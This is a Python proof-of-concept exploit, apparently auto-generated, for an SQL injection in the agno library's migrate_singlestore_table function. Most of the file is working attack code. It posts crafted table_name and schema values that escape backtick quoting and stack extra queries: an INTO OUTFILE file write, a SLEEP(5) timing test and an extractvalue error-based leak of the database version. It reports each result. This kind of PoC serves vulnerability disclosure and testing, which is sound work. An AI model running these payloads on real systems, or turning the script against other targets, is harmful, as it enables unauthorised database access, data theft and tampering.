#!/usr/bin/env python3
# PoC for agno (/tmp/agno/libs/agno)
# Path: sqli-019
# Sink: migrate_singlestore_table
# Auto-generated — run with: python3 sqli_api_making_reachable_external_migrate_singlestore_table.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for SQL injection in agno library's
migrate_singlestore_table function.

Vulnerability: The function constructs ALTER TABLE SQL statements using
f-strings with user-controlled table_name and schema parameters without
sanitization or parameterization. This allows an attacker to inject
arbitrary SQL commands.

Impact: An attacker can execute arbitrary SQL statements on the database,
potentially leading to data exfiltration, modification, or destruction.

This PoC demonstrates the vulnerability by injecting a benign payload
that creates a file on the database server (if the database user has
FILE privilege) or performs a time-based detection.

Usage:
    python3 poc.py --target http://target:port/api/endpoint
                   --table "injected_table_name"
                   --schema "injected_schema"
"""

import argparse
import sys
import time
import urllib.request
import urllib.error
import urllib.parse
import json
import os

# Default target - change as needed
DEFAULT_TARGET = "http://localhost:8000/api/migrate"
DEFAULT_TABLE = "test_table"
DEFAULT_SCHEMA = "test_schema"


def send_request(target_url, table_name, schema):
    """
    Send a request to the vulnerable endpoint with the given table_name and schema.
    
    Args:
        target_url: The URL of the vulnerable API endpoint
        table_name: The table name parameter (may contain injection)
        schema: The schema parameter (may contain injection)
    
    Returns:
        Response text or None on error
    """
    # Construct the request body - adjust based on actual API format
    # The vulnerable function expects table_name and schema as parameters
    payload = {
        "table_name": table_name,
        "schema": schema
    }
    
    data = json.dumps(payload).encode('utf-8')
    req = urllib.request.Request(
        target_url,
        data=data,
        headers={'Content-Type': 'application/json'},
        method='POST'
    )
    
    try:
        with urllib.request.urlopen(req, timeout=10) as response:
            return response.read().decode('utf-8')
    except urllib.error.HTTPError as e:
        # Even error responses may contain useful information
        return e.read().decode('utf-8') if e.fp else str(e)
    except urllib.error.URLError as e:
        print(f"[!] Connection error: {e.reason}")
        return None
    except Exception as e:
        print(f"[!] Unexpected error: {e}")
        return None


def test_benign_injection(target_url):
    """
    Test with a benign injection that attempts to create a file on the server.
    This uses MySQL's INTO OUTFILE clause (requires FILE privilege).
    
    The injection breaks out of the backtick-quoted identifier and injects
    arbitrary SQL before the ALTER TABLE statement completes.
    """
    print("[*] Testing benign SQL injection...")
    
    # Injection payload: close the backtick, inject a SELECT ... INTO OUTFILE
    # The original query is:
    #   ALTER TABLE `{schema}`.`{table_name}` ADD COLUMN content_hash TEXT;
    #
    # We inject: `schema`.`table_name`; SELECT 'pwned' INTO OUTFILE '/tmp/poc_success.txt'; -- 
    # This makes the query:
    #   ALTER TABLE `schema`.`table_name`; SELECT 'pwned' INTO OUTFILE '/tmp/poc_success.txt'; -- `.`table_name` ADD COLUMN content_hash TEXT;
    #
    # The semicolon ends the ALTER TABLE, then our SELECT executes, and -- comments out the rest.
    
    # Benign payload that writes to a file
    malicious_table = "x`; SELECT 'pwned' INTO OUTFILE '/tmp/poc_success.txt'; -- "
    malicious_schema = "x`; SELECT 'pwned' INTO OUTFILE '/tmp/poc_success.txt'; -- "
    
    print(f"[*] Using table_name: {malicious_table}")
    print(f"[*] Using schema: {malicious_schema}")
    
    response = send_request(target_url, malicious_table, malicious_schema)
    
    if response:
        print(f"[*] Response: {response[:200]}...")
    
    # Check if the file was created
    time.sleep(1)  # Give the server time to process
    if os.path.exists('/tmp/poc_success.txt'):
        print("[+] SUCCESS: File /tmp/poc_success.txt was created!")
        print("[+] The SQL injection was successful!")
        with open('/tmp/poc_success.txt', 'r') as f:
            print(f"[+] File contents: {f.read()}")
        return True
    else:
        print("[-] File was not created. The database user may not have FILE privilege.")
        print("[*] Trying alternative detection method...")
        return False


def test_time_based_injection(target_url):
    """
    Test with a time-based blind SQL injection to confirm vulnerability
    even without FILE privilege.
    
    Uses MySQL's SLEEP() function to cause a delay.
    """
    print("[*] Testing time-based blind SQL injection...")
    
    # Injection that causes a 5-second delay
    # Original: ALTER TABLE `{schema}`.`{table_name}` ADD COLUMN content_hash TEXT;
    # Injected: ALTER TABLE `x`; SELECT SLEEP(5); -- `.`x` ADD COLUMN content_hash TEXT;
    
    malicious_table = "x`; SELECT SLEEP(5); -- "
    malicious_schema = "x`; SELECT SLEEP(5); -- "
    
    print("[*] Sending request with SLEEP(5) injection...")
    start_time = time.time()
    
    response = send_request(target_url, malicious_table, malicious_schema)
    
    elapsed = time.time() - start_time
    print(f"[*] Request took {elapsed:.2f} seconds")
    
    if elapsed >= 4.5:  # Allow some margin for network latency
        print(f"[+] SUCCESS: Request took {elapsed:.2f} seconds, indicating SLEEP(5) executed!")
        print("[+] Time-based SQL injection confirmed!")
        return True
    else:
        print(f"[-] Request completed in {elapsed:.2f} seconds, no significant delay detected.")
        print("[*] The injection may not have worked, or the database is not MySQL/MariaDB.")
        return False


def test_error_based_injection(target_url):
    """
    Test with an error-based injection to extract database information.
    Uses MySQL's extractvalue() function to cause an error that reveals data.
    """
    print("[*] Testing error-based SQL injection...")
    
    # Injection that causes an error with database version
    # This uses extractvalue() to generate an error that includes the version
    malicious_table = "x`; SELECT extractvalue(1, concat(0x7e, version())); -- "
    malicious_schema = "x`; SELECT extractvalue(1, concat(0x7e, version())); -- "
    
    print("[*] Sending request with error-based injection...")
    response = send_request(target_url, malicious_table, malicious_schema)
    
    if response:
        print(f"[*] Response: {response[:500]}")
        # Look for MySQL error messages containing version info
        if "XPATH" in response or "version" in response.lower() or "error" in response.lower():
            print("[+] SUCCESS: Error-based injection appears to have worked!")
            print("[+] Database information may be visible in the error message.")
            return True
    
    print("[-] No error-based evidence detected.")
    return False


def main():
    parser = argparse.ArgumentParser(
        description="PoC for SQL injection in agno library's migrate_singlestore_table"
    )
    parser.add_argument(
        "--target",
        default=DEFAULT_TARGET,
        help=f"Target URL (default: {DEFAULT_TARGET})"
    )
    parser.add_argument(
        "--table",
        default=DEFAULT_TABLE,
        help="Table name parameter (default: test_table)"
    )
    parser.add_argument(
        "--schema",
        default=DEFAULT_SCHEMA,
        help="Schema parameter (default: test_schema)"
    )
    parser.add_argument(
        "--method",
        choices=["benign", "time", "error", "all"],
        default="all",
        help="Injection method to test (default: all)"
    )
    
    args = parser.parse_args()
    
    print("=" * 60)
    print("agno SQL Injection Proof-of-Concept")
    print("=" * 60)
    print(f"[*] Target: {args.target}")
    print(f"[*] Default table: {args.table}")
    print(f"[*] Default schema: {args.schema}")
    print()
    
    # First, test with normal parameters to confirm the endpoint works
    print("[*] Testing with normal parameters...")
    response = send_request(args.target, args.table, args.schema)
    if response:
        print(f"[*] Normal response received: {response[:100]}...")
    else:
        print("[!] Could not reach the target. Check the URL and try again.")
        sys.exit(1)
    
    print()
    
    success = False
    
    if args.method in ("benign", "all"):
        if test_benign_injection(args.target):
            success = True
    
    if args.method in ("time", "all"):
        if test_time_based_injection(args.target):
            success = True
    
    if args.method in ("error", "all"):
        if test_error_based_injection(args.target):
            success = True
    
    print()
    if success:
        print("[+] VULNERABILITY CONFIRMED: SQL injection in migrate_singlestore_table")
        print("[+] The function does not sanitize table_name or schema parameters")
        print("[+] An attacker can execute arbitrary SQL commands on the database")
    else:
        print("[-] Could not confirm the vulnerability with the tested methods.")
        print("[*] The target may not be vulnerable, or the injection point differs.")
        print("[*] Review the actual API endpoint and adjust the payload format.")


if __name__ == "__main__":
    main()
